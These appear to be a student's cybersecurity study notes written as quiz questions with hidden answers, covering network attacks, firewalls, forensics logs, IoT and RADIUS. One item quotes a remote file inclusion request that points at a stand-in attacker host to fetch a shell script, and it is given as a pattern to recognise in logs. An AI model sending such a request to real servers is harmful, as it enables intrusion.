
<a href="/static/cyber_notes/Cyber_W8_knowledge.html" data-router-ignore>Link to W8 Malware</a>

<a href="/static/cyber_notes/Cyber_W9_Network_Security.html" data-router-ignore>Link to W9 Network Security</a>

<a href="/static/cyber_notes/Cyber_W10_Digital_Forensics.html" data-router-ignore>Link to W10 Digital Forensics</a>

<a href="/static/cyber_notes/Cyber_W11_IoT_Security.html" data-router-ignore>Link to W11 IoT Security</a>



### Loadable Kernel Modules
- Drivers are LKM and run in ring 0 with the kernel


### Stateful Packet Filter
- Stateful filter keeps a state table of connections


## SYN Flood
If you **flood** a server and the **Server's Internet link** is **far from full**, yet new clients **cannot connect**. Why ?

> [!Answer]-
>   Its queue of half-open connections if full


## Wireshark

An attacker on a switched LAN runs Wireshark in **promiscuous mode** but sees only broadcasts and their own traffic. What do they need to **add** to **read other hosts' traffic**?

> [!Answer]-
> **ARP Poisoning**
> Active Sniffing: Inject forged ARP replies make other hosts send their frames to the attacker.


## Browser Source Port
Outbound firewall rules: (1) **Deny** TCP from **any IP**, source port **80**, to **24.180.49.139 port 80**. (2) Default: allow everything. A browser opens `http://24.180.49.139/`  What happens?

> [!Answer]-
> **Allowed**: Its source port is not 80
> 
> Browsers use a source port between **1024 - 65535**, so **rule 1 never matches** and the default allows it.


## Log contains IP
An IDS alert names internal address 10.0.5.77 at 02:14. Which log shows which device (MAC address) held that IP at that time?

> [!Answer]-
> **DHCP Server Log**
> 
> DHCP logs hold leased IP addresses by MAC address


### Which setup ?
Which setups let an investigator's sniffer capture traffic between two other hosts? (Select all that apply)

> [!Answer]-
> Connecting all three machines to hub (Hub repeats traffic to every port)
> 
> Putting a network tap on the link 
> 
> Using a SPAN (Mirror) port on their switch


## Types of IoT
A city fits sensors to street lamps and drains. They report to a central management system and a public app. Which IoT application type from the deck is this?

> [!Answer]-
> **Infrastructure IoT**
> 
> Smart Cities: Infrastructure sensors, management systems and user apps


# Forensics

## Windows Registry
According to the lecture, which can be recovered from the Windows Registry? (Select all that apply)

> [!Answer]-
> - Programs that were executed
> - Usernames and personal settings
> - Web browsing activity

## Application Proxy
Which statements about an application proxy (proxy firewall) match the lecture? (Select all that apply)

> [!Answer]-
> - It hides internal clients' IP addresses (Private/Anonymous Internet Access)
> - It can cache frequently visited pages (Reduce traffic & Improves performance)

## Attack Pattern
A web server log contains the request `/include/?file=http://evil.fr/sh`. Which attack does this pattern indicate?

> [!Answer]-
> **Remote File Inclusion**
> - A parameter that points to a file on an external server

## SYN Capture
A capture shows one host sending SYN segments to port 80 on 192.168.77.27, .28, .29 and so on up to .34 within a few milliseconds. Which statements are reasonable? (Select all that apply)

> [!Answer]-
> - The SYN flag is the bit 0x02 in the TCP header
> - One port is being probed across many hosts

## RADIUS
A laptop joins the office Wi-Fi using 802.1X. The access point passes the login to a central server for checking. In RADIUS terms, the access point is the:

> [!Answer]-
> NAS (The network access server is the connecting point)

## Privilege-Escalation Attack Sequence
Which order matches the lecture's privilege-escalation attack sequence?

> [!Answer]-
> 1. Unprivileged Access
> 2. Escalate Privileges
> 3. Install Rootkit
> 4. Abuse System


## After MAC Flooding
After a successful MAC flooding attack on a switch, which statements are true? (Select all that apply)

> [!Answer]-
> - Frames for legitimate hosts are flooded out of all ports (Real address not found in table, so frame is flooded)
> - MAC table is full of fake source address
> - Attacker can receive frames meant for others

# Lab 2 





















